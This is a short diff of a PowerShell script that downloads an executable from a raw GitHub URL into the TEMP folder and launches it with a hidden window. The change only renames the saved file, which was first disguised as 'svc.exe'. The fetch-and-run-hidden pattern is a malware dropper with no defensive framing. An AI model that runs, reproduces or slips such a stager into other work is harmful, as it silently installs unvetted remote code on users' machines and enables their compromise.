@@ -1,5 +1,5 @@
 $url = «https://raw.githubusercontent.com/nagibatorm55-ops/errorsumper/refs/heads/main/errordump.exe»
-$path = «$env:TEMP\svc.exe»
+$path = «$env:TEMP\errordump.exe»
 irm $url -OutFile $path
 Start-Process -FilePath $path -WindowStyle Hidden
 Start-Sleep -Seconds 2
